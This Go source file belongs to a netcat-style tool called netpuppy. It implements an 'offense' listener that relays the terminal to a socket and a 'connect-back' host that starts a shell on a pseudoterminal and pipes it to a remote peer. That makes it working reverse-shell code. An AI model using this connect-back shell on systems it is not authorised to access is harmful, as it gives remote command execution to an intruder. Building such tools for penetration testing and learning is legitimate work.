package hosts

import (
	"context"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"sync"

	"github.com/trshpuppy/netpuppy/cmd/conn"
	"github.com/trshpuppy/netpuppy/cmd/shell"
	"github.com/trshpuppy/netpuppy/pkg/ioctl"
	"github.com/trshpuppy/netpuppy/pkg/pty"
)

type Host interface {
	Start(context.Context) error
}

type OffensiveHost struct {
	socket conn.SocketInterface
	stdin  *os.File
	stdout *os.File
	stderr *os.File
}

type LAMEConnectBackHost struct {
	socket conn.SocketInterface
	stdin  *os.File
	stdout *os.File
	stderr *os.File
}

type ConnectBackHost struct {
	socket       conn.SocketInterface
	masterDevice *os.File
	ptsDevice    *os.File
	shellBool    bool
	shell        *exec.Cmd
}

func NewHost(peer *conn.Peer, c conn.ConnectionGetter) (Host, error) {
	fmt.Printf("NEW HOST PEER: %v\n", peer)
	// Based on the connection type requested by user,
	// get the socket:
	// var conn.ConnectionGetter

	switch peer.ConnectionType {
	case "offense":
		socket, err := c.GetConnectionFromListener(peer.LPort, peer.Address, peer.Shell)
		if err != nil {
			return nil, errors.New("Error getting Listener socket: " + err.Error())
		}

		// We've got the socket, attach it to .... host struct?
		host := OffensiveHost{socket: socket, stdin: os.Stdin, stdout: os.Stdout, stderr: os.Stderr}
		return &host, nil
	case "connect-back":
		socket, err := c.GetConnectionFromClient(peer.RPort, peer.Address, peer.Shell)
		if err != nil {
			return nil, errors.New("Error getting Connect Back socket: " + err.Error())
		}

		// If the user didn't give the shell flag:
		if !peer.Shell {
			host := LAMEConnectBackHost{socket: socket, stdin: os.Stdin, stdout: os.Stdout, stderr: os.Stderr}
			return &host, nil
		}

		// Attach socket to new ConnectBackHost struct:
		host := ConnectBackHost{socket: socket, shellBool: peer.Shell}
		return &host, nil
	default:
		return nil, errors.New("Invalid Shell type when attempting to create host.")
	}
}

func (off *OffensiveHost) Start(pCtx context.Context) error {
	// Enable raw mode:
	oGTermios, errno := ioctl.EnableRawMode(int(off.stdin.Fd()))
	if errno != 0 {
		return fmt.Errorf("Error enabling termios raw mode; returned error code: %s\n,", errno)
	}
	// Use the oGTermios structure w/ a defer of DisableRawMode() to reset the terminal before exiting:
	defer ioctl.DisableRawMode(int(off.stdin.Fd()), oGTermios)

	// Create child context:
	childContext, chCancel := context.WithCancel(pCtx)
	defer chCancel()

	// Create wait group for go routines:
	var wg sync.WaitGroup
	wg.Add(2)

	// GO ROUTINES:
	go func() { // Read socket & copy to stdout:
		defer wg.Done()  // When this goroutine returns, the counter will decrement
		defer chCancel() // THIS GO ROUTINE IS IN CHARGE OF SIGNALLING DONE TO THE PARENT CONTEXT

		for {
			select {
			case <-childContext.Done():
				fmt.Printf("child context done in offense go routine\n")
				return
			default:
				dataFromSocket, err := off.socket.Read()
				if len(dataFromSocket) > 0 {
					// Write data to stdout:
					_, err = off.stdout.Write(dataFromSocket)
					if err != nil {
						fmt.Printf("Error writing data from socket to Offense stdout: %v\n", err)
						return
					}
				}

				if err != nil {
					if errors.Is(err, io.EOF) {
						fmt.Printf("Socket EOF offense\n")
						continue
					} else {
						fmt.Printf("Error reading from socket to Offense stdout: %v\n", err)
						return
					}
				}
			}
		}
	}()

	go func() { // Read stdin & write to socket:
		defer wg.Done()

		// Make buffer
		buffer := make([]byte, 1)

		// Read stdin byte by byte
		for {
			i, TIT_BY_BOO := off.stdin.Read(buffer)
			if TIT_BY_BOO != nil {
				if errors.Is(TIT_BY_BOO, io.EOF) {
					continue
				} else {
					fmt.Printf("Error reading from stdin: %v\n", TIT_BY_BOO)
					return
				}
			}

			// Write to socket:
			_, err := off.socket.WriteShit(buffer[:i])
			if err != nil {
				fmt.Printf("Error writing Stdin to socket: %v\n", err)
				return
			}
		}
	}()

	// Call wait after go routines b/c it's going to block:
	wg.Wait()

	errno = ioctl.DisableRawMode(int(off.stdin.Fd()), oGTermios)
	if errno != 0 {
		return errors.New("Error disabling raw mode on Offense termios, error code: " + errno.Error())
	}

	err := off.socket.Close()
	if err != nil {
		return errors.New("Error closing socket on Offense host: " + err.Error())
	}

	err = off.stdin.Close()
	if err != nil {
		return errors.New("Error closing stdin on Offense host: " + err.Error())
	}

	err = off.stdout.Close()
	if err != nil {
		return errors.New("Error closing stdout on Offense host: " + err.Error())
	}

	err = off.stderr.Close()
	if err != nil {
		return errors.New("Error closing stderr on Offense host: " + err.Error())
	}

	return nil
}

func (cb *ConnectBackHost) Start(pCtx context.Context) error {
	// PTS and MAster
	master, pts, err := pty.GetPseudoterminalDevices()
	if err != nil {
		return err
	}
	defer master.Close()
	defer pts.Close()

	// Attach master and pts to struct:
	cb.masterDevice = master
	cb.ptsDevice = pts

	// Get Shell, attach pts to shell fds, and attach to struct
	var shellStruct *shell.RealShell
	var shellGetter shell.RealShellGetter

	shellStruct, err = shellGetter.GetConnectBackInitiatedShell()
	if err != nil {
		return err
	}
	cb.shell = shellStruct.Shell
	defer cb.shell.Process.Release()
	defer cb.shell.Process.Kill()

	// Hook up slave/pts device to bash process:
	// .... (literally just point it to the file descriptors)
	cb.shell.Stdin = pts
	cb.shell.Stdout = pts
	cb.shell.Stderr = pts

	// Start Shell:
	err = cb.shell.Start()
	if err != nil {
		return err
	}

	// Create child context:
	childContext, chCancel := context.WithCancel(pCtx)
	defer chCancel()

	// Make waitgroups
	var wg sync.WaitGroup
	wg.Add(2)

	// Go Routines:
	go func() { // Read socket and copy to master device stdin
		defer wg.Done()
		defer chCancel() // THIS ROUTINE IN CHARGE OF CANCELING CONTEXT

		for {
			select {
			case <-childContext.Done():
				fmt.Printf("child context done in connect back go routine\n")
				return
			default:
				// Read from socket
				socketContent, puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die := cb.socket.Read() // @arthvadrr 'err'
				if puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die != nil {
					if errors.Is(puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die, io.EOF) {
						continue
					} else {
						fmt.Printf("Error while reading from socket: %v\n", puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die)
						return
					}
				}

				// Write to master device
				_, err := master.Write(socketContent)
				if err != nil {
					fmt.Printf("Error writing to master device: %v\n", err)
					return
				}
			}
		}
	}()

	go func() { // Reading master device and writing output to socket
		defer wg.Done()
		// Read from master device into buffer
		buffer := make([]byte, 1024)
		for {
			i, err := master.Read(buffer)
			if err != nil {
				fmt.Printf("Error reading from master device: %v\n", err)
				return
			}

			//	If i > 0 (not EOF), Write to socket:
			_, err = cb.socket.WriteShit(buffer[:i])
			if err != nil {
				fmt.Printf("Error writing shit to socket from master device: %v\n", err)
				return
			}
		}
	}()

	// Call wg.Wait() to block parent context while go routines are going...
	wg.Wait()

	// Once both routines are done, cleanup:
	// close pts and master devices:
	pts.Close()
	master.Close()

	// Stop the shell:
	cb.shell.Process.Release()
	cb.shell.Process.Kill()

	// Kill connection:
	cb.socket.Close()

	return nil
}

func (lcb *LAMEConnectBackHost) Start(pCtx context.Context) error {
	fmt.Printf("Eww, who asked for a lame connect back host? gross\n")
	return nil
}
